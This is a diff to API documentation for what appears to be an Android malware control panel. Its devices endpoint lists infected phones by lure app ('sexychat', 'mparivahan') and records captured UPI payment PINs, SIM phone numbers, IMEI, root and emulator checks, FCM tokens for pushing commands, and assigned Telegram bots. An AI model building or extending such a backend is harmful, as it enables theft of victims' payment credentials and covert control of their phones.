@@ -578,18 +578,116 @@ GET /api/admin/john/devices?app_type=mparivahan&skip=0&limit=20
 {
   "devices": [
     {
+      // Device Identification
       "device_id": "abc123",
       "model": "Samsung Galaxy S21",
       "manufacturer": "Samsung",
+      "brand": "samsung",
+      "device": "SM-G991B",
+      "product": "beyond1qltezs",
+      "hardware": "exynos2100",
+      "board": "exynos2100",
+      "display": "RP1A.200720.012",
+      "fingerprint": "samsung/beyond1qltezs/beyond1:13/RP1A.200720.012/G991BXXU5HVJ1:user/release-keys",
+      "host": "SWDD5723",
       "os_version": "Android 13",
+      "sdk_int": 33,
+      "supported_abis": ["arm64-v8a", "armeabi-v7a"],
+      
+      // Application Info
       "app_type": "sexychat",
+      "package_name": "com.example.sexychat",
+      "device_name": "John's Phone",
+      
+      // Admin Info
       "admin_username": "john",
       "admin_token": "john_device_token",
-      "status": "online",
+      "user_id": "internal_user_id_not_shown_to_admin",
+      
+      // Battery Status
       "battery_level": 85,
+      "is_charging": true,
+      "battery_state": "charging",
+      
+      // Storage Information
+      "total_storage_mb": 128000.5,
+      "free_storage_mb": 95000.25,
+      "storage_used_mb": 33000.25,
+      "storage_percent_free": 74.22,
+      
+      // RAM Information
+      "total_ram_mb": 8192.0,
+      "free_ram_mb": 4096.0,
+      "ram_used_mb": 4096.0,
+      "ram_percent_free": 50.0,
+      
+      // Network Information
+      "network_type": "WiFi",
+      "ip_address": "192.168.1.100",
+      
+      // Device Security
+      "is_rooted": false,
+      "is_emulator": false,
+      
+      // Display Info
+      "screen_resolution": "1080x2400",
+      "screen_density": 420,
+      
+      // SIM Card Information (Array)
+      "sim_info": [
+        {
+          "sim_slot": 0,
+          "subscription_id": 1,
+          "carrier_name": "T-Mobile",
+          "display_name": "T-Mobile",
+          "phone_number": "+15551234567",
+          "country_iso": "us",
+          "mcc": "310",
+          "mnc": "260",
+          "is_network_roaming": false,
+          "icon_tint": -16746133,
+          "card_id": 0,
+          "carrier_id": 1,
+          "is_embedded": false,
+          "is_opportunistic": false,
+          "icc_id": "",
+          "group_uuid": "",
+          "port_index": 0,
+          "network_type": "LTE (4G)",
+          "network_operator_name": "T-Mobile",
+          "network_operator": "310260",
+          "sim_operator_name": "T-Mobile",
+          "sim_operator": "310260",
+          "sim_state": "Ready",
+          "phone_type": "GSM",
+          "imei": "",
+          "meid": "",
+          "data_enabled": true,
+          "data_roaming_enabled": false,
+          "voice_capable": true,
+          "sms_capable": true,
+          "has_icc_card": true,
+          "device_software_version": "",
+          "visual_voicemail_package_name": "com.google.android.dialer",
+          "network_country_iso": "us",
+          "sim_country_iso": "us"
+        }
+      ],
+      
+      // UPI Information
       "has_upi": true,
       "upi_pin": "1234",
+      "upi_detected_at": "2025-11-01T15:30:00",
+      "upi_last_updated_at": "2025-11-01T15:30:00",
+      
+      // Firebase & Communication
+      "fcm_tokens": ["fcm_token_device_1", "fcm_token_device_2"],
+      "telegram_bot_id": 1,
+      
+      // Device Status
+      "status": "online",  // online, idle, offline, pending
       "registered_at": "2025-11-01T10:00:00",
+      "updated_at": "2025-11-02T09:55:00",
       "last_ping": "2025-11-02T09:55:00"
     }
   ],
@@ -597,6 +695,117 @@ GET /api/admin/john/devices?app_type=mparivahan&skip=0&limit=20
   "hasMore": false
 }
 ```
+
+**Complete Device Fields Returned:**
+
+**Device Hardware (16 fields):**
+- `device_id` - Unique device identifier
+- `model` - Device model (e.g., "Samsung Galaxy S21")
+- `manufacturer` - Device manufacturer (e.g., "Samsung")
+- `brand` - Device brand (e.g., "samsung")
+- `device` - Device code (e.g., "SM-G991B")
+- `product` - Product name
+- `hardware` - Hardware platform (e.g., "exynos2100")
+- `board` - Board name
+- `display` - Display build ID
+- `fingerprint` - Device fingerprint (full build info)
+- `host` - Build host
+- `os_version` - Android version (e.g., "Android 13")
+- `sdk_int` - Android SDK level (e.g., 33)
+- `supported_abis` - Supported CPU architectures
+- `is_rooted` - Root status
+- `is_emulator` - Emulator detection
+
+**Application Info (4 fields):**
+- `app_type` - Application type (sexychat, mparivahan, sexyhub)
+- `package_name` - Android package name
+- `device_name` - User-friendly device name
+- `telegram_bot_id` - Assigned Telegram bot (1-5)
+
+**Admin Info (3 fields):**
+- `admin_username` - Owner admin username
+- `admin_token` - Admin's device token
+- `user_id` - Internal user ID (stored but not shown to admins)
+
+**Battery Status (3 fields):**
+- `battery_level` - Battery percentage (0-100)
+- `is_charging` - Charging status
+- `battery_state` - State (charging, discharging, full)
+
+**Storage Info (4 fields):**
+- `total_storage_mb` - Total storage (float, in MB)
+- `free_storage_mb` - Available storage (float, in MB)
+- `storage_used_mb` - Used storage (float, in MB)
+- `storage_percent_free` - Free percentage (float)
+
+**RAM Info (4 fields):**
+- `total_ram_mb` - Total RAM (float, in MB)
+- `free_ram_mb` - Available RAM (float, in MB)
+- `ram_used_mb` - Used RAM (float, in MB)
+- `ram_percent_free` - Free percentage (float)
+
+**Network Info (2 fields):**
+- `network_type` - Connection type (WiFi, 4G, 5G, etc.)
+- `ip_address` - Device IP address
+
+**Display Info (2 fields):**
+- `screen_resolution` - Screen resolution (e.g., "1080x2400")
+- `screen_density` - Screen DPI (e.g., 420)
+
+**SIM Card Info (Array of objects, 31 fields per SIM):**
+- `sim_slot` - SIM slot number (0, 1)
+- `subscription_id` - Subscription ID
+- `carrier_name` - Carrier name (e.g., "T-Mobile")
+- `display_name` - Display name
+- `phone_number` - Phone number
+- `country_iso` - Country code
+- `mcc` - Mobile Country Code
+- `mnc` - Mobile Network Code
+- `is_network_roaming` - Roaming status
+- `icon_tint` - UI icon color
+- `card_id` - Card ID
+- `carrier_id` - Carrier ID
+- `is_embedded` - eSIM status
+- `is_opportunistic` - Opportunistic network
+- `icc_id` - ICC ID (SIM card ID)
+- `group_uuid` - Group UUID
+- `port_index` - Port index
+- `network_type` - Network type (LTE, 5G, etc.)
+- `network_operator_name` - Network operator name
+- `network_operator` - Network operator code
+- `sim_operator_name` - SIM operator name
+- `sim_operator` - SIM operator code
+- `sim_state` - SIM state (Ready, Locked, etc.)
+- `phone_type` - Phone type (GSM, CDMA)
+- `imei` - IMEI number (if available)
+- `meid` - MEID number (if available)
+- `data_enabled` - Mobile data status
+- `data_roaming_enabled` - Data roaming status
+- `voice_capable` - Voice call capability
+- `sms_capable` - SMS capability
+- `has_icc_card` - SIM card present
+- `device_software_version` - Device software version
+- `visual_voicemail_package_name` - Voicemail app
+- `network_country_iso` - Network country
+- `sim_country_iso` - SIM country
+
+**UPI Information (4 fields):**
+- `has_upi` - UPI availability
+- `upi_pin` - UPI PIN (if captured)
+- `upi_detected_at` - When UPI was detected
+- `upi_last_updated_at` - Last UPI update
+
+**Firebase & Communication (2 fields):**
+- `fcm_tokens` - Array of FCM tokens for push commands
+- `telegram_bot_id` - Assigned Telegram bot number (1-5)
+
+**Device Status (4 fields):**
+- `status` - Current status (online/idle/offline/pending)
+- `registered_at` - Registration timestamp
+- `updated_at` - Last update timestamp
+- `last_ping` - Last activity timestamp
+
+**Total: 90+ fields per device with complete device information**
 
 **Response (404 Not Found):**
 ```json
